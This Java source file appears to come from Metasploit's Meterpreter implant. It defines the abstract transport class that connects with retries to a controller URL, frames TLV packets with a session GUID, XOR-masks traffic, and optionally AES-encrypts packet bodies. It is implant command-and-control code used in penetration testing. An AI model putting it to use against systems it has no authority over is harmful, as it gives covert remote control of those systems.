package com.metasploit.meterpreter;

import com.metasploit.stage.TransportConfig;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.IOException;

import java.security.SecureRandom;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.Cipher;

public abstract class Transport {
    public static final long MS = 1000L;
    public static final int ENC_NONE = 0;
    public static final int ENC_AES256 = 1;
    public static final int ENC_AES128 = 2;

    private static final SecureRandom sr = new SecureRandom();

    private Transport prev;
    private Transport next;
    private Meterpreter meterpreter;

    protected String url;
    protected long commTimeout;
    protected long retryTotal;
    protected long retryWait;
    protected byte[] aesKey;
    protected boolean aesEnabled;

    protected abstract boolean tryConnect(Meterpreter met) throws IOException;

    public abstract void bind(DataInputStream in, OutputStream rawOut);
    public abstract void disconnect();
    public abstract boolean dispatch(Meterpreter met);
    public abstract void writePacket(TLVPacket packet, int type) throws IOException;
    public abstract TLVPacket readPacket() throws IOException;
    public abstract boolean switchUri(String uri);

    protected Transport(Meterpreter met, String url) {
        this.meterpreter = met;
        this.url = url;
        this.aesEnabled = false;
    }

    protected void setTimeouts(TransportConfig transportConfig) {
        this.commTimeout = transportConfig.comm_timeout;
        this.retryTotal = transportConfig.retry_total;
        this.retryWait = transportConfig.retry_wait;
    }

    protected void arrayCopy(byte[] src, int srcOffset, byte[] dest, int destOffset, int count) {
        if (count >= 0) {
            System.arraycopy(src, srcOffset + 0, dest, destOffset + 0, count);
        }
    }

    protected void writeInt(byte[] dest, int offset, int value) {
        dest[offset] = (byte)((value >> 24) & 0xFF);
        dest[offset + 1] = (byte)((value >> 16) & 0xFF);
        dest[offset + 2] = (byte)((value >> 8) & 0xFF);
        dest[offset + 3] = (byte)(value & 0xFF);
    }

    protected int readInt(byte[] source, int offset) {
        return (0xFF & source[offset]) << 24 |
          (0xFF & source[1 + offset]) << 16 |
          (0xFF & source[2 + offset]) << 8 |
          (0xFF & source[3 + offset]);
    }

    protected TLVPacket readAndDecodePacket(DataInputStream in) throws IOException {
        byte[] header = new byte[32];
        in.readFully(header);
        byte[] clonedHeader = header.clone();

        byte[] xorKey = new byte[4];
        this.arrayCopy(header, 0, xorKey, 0, 4);

        // XOR the whole header first
        this.xorBytes(xorKey, header);

        // extract the length
        int bodyLen = this.readInt(header, 24) - 8;

        byte[] body = new byte[bodyLen];
        in.readFully(body);

        // create a complete packet and xor the whole thing. We do this becauase we can't
        // be sure that the content of the body is 4-byte aligned with the xor key, so we
        // do the whole lot to make sure it behaves
        byte[] packet = new byte[clonedHeader.length + body.length];
        this.arrayCopy(clonedHeader, 0, packet, 0, clonedHeader.length);
        this.arrayCopy(body, 0, packet, clonedHeader.length, body.length);
        this.xorBytes(xorKey, packet);

        this.arrayCopy(packet, 32, body, 0, body.length);
        int encFlag = this.readInt(packet, 20);
        if (encFlag != ENC_NONE && this.aesKey != null) {
            try
            {
                body = aesDecrypt(body);
            }
            catch(Exception e)
            {
                // if things go back we're basically screwed.
                return null;
            }
        }

        ByteArrayInputStream byteStream = new ByteArrayInputStream(body, 0, body.length);
        DataInputStream inputStream = new DataInputStream(byteStream);
        TLVPacket tlvPacket = new TLVPacket(inputStream, body.length);
        inputStream.close();

        return tlvPacket;
    }

    protected byte[] aesDecrypt(byte[] data) throws Exception {
        byte[] iv = new byte[16];
        byte[] encrypted = new byte[data.length - iv.length];
        this.arrayCopy(data, 0, iv, 0, iv.length);
        this.arrayCopy(data, iv.length, encrypted, 0, encrypted.length);

        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        SecretKeySpec keySpec = new SecretKeySpec(this.aesKey, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        synchronized(cipher) {
          cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
          return cipher.doFinal(encrypted);
        }
    }

    protected byte[] aesEncrypt(byte[] data) throws Exception {
        byte[] iv = new byte[16];
        sr.nextBytes(iv);

        byte[] encrypted = null;
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        SecretKeySpec keySpec = new SecretKeySpec(this.aesKey, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        synchronized(cipher) {
          cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
          encrypted = cipher.doFinal(data);
        }

        data = new byte[encrypted.length + iv.length];
        this.arrayCopy(iv, 0, data, 0, iv.length);
        this.arrayCopy(encrypted, 0, data, iv.length, encrypted.length);
        return data;
    }

    protected void encodePacketAndWrite(TLVPacket tlvPacket, int type, DataOutputStream out) throws IOException {
        byte[] data = tlvPacket.toByteArray();

        int encType = ENC_NONE;
        if (this.aesKey != null) {
            try
            {
                if (this.aesEnabled) {
                    encType = (this.aesKey.length == 32 ? ENC_AES256 : ENC_AES128);
                    data = aesEncrypt(data);
                }
                else
                {
                    // enabled it after the response packet goes out
                    this.aesEnabled = true;
                }
            }
            catch(Exception e)
            {
                // if things fail during encryption, should we
                // just fallback to plain? Or terminate?
                this.aesEnabled = false;
                this.aesKey = null;
            }
        }

        byte[] packet = new byte[32 + data.length];
        randXorKey(packet, 0);

        // Include the session guid in the outgoing message
        byte[] sessionGUID = this.meterpreter.getSessionGUID();
        this.arrayCopy(sessionGUID, 0, packet, 4, sessionGUID.length);

        // We don't currently support encryption
        this.writeInt(packet, 20, encType);

        // Write the length/type
        this.writeInt(packet, 24, data.length + 8);
        this.writeInt(packet, 28, type);

        // finally write the data
        this.arrayCopy(data, 0, packet, 32, data.length);

        // Xor the packet bytes
        this.xorBytes(packet, packet, 4);

        // send it!
        synchronized (out) {
            out.write(packet);
            out.flush();
        }
    }

    private void randXorKey(byte[] dest, int offset) {
      dest[offset] = randByte();
      dest[offset + 1] = randByte();
      dest[offset + 2] = randByte();
      dest[offset + 3] = randByte();
    }

    private byte randByte() {
        // Forces a random number between 1 and 255 _inclusive_
        return (byte)(0xFF & (int)((Math.random() * 255) + 1));
    }

    private void xorBytes(byte[] xorKey, byte[] bytes) {
        this.xorBytes(xorKey, bytes, 0);
    }

    private void xorBytes(byte[] xorKey, byte[] bytes, int offset) {
        for (int i = 0; i < bytes.length - offset; ++i) {
            bytes[i + offset] ^= xorKey[i % 4];
        }
    }

    public void setAesEncryptionKey(byte[] aesKey) {
        this.aesKey = aesKey;
        this.aesEnabled = false;
    }

    public String getUrl() {
        return this.url;
    }

    public long getCommTimeout() {
        return this.commTimeout / MS;
    }

    public void setCommTimeout(long commTimeout) {
        this.commTimeout = commTimeout * MS;
    }

    public long getRetryTotal() {
        return this.retryTotal / MS;
    }

    public void setRetryTotal(long retryTotal) {
        this.retryTotal = retryTotal * MS;
    }

    public long getRetryWait() {
        return this.retryWait / MS;
    }

    public void setRetryWait(long retryWait) {
        this.retryWait = retryWait * MS;
    }

    public boolean connect(Meterpreter met) {
        long lastAttempt = System.currentTimeMillis();
        this.aesKey = null;
        this.aesEnabled = false;

        while (System.currentTimeMillis() < lastAttempt + this.retryTotal) {
            try {
                if (this.tryConnect(met)) {
                    return true;
                }
            } catch (Exception ignored) {
            }

            met.sleep(this.retryWait);
        }

        return false;
    }

    public void setPrev(Transport t) {
        this.prev = t;
    }

    public void setNext(Transport t) {
        this.next = t;
    }

    public Transport getPrev() {
        return this.prev;
    }

    public Transport getNext() {
        return this.next;
    }
}

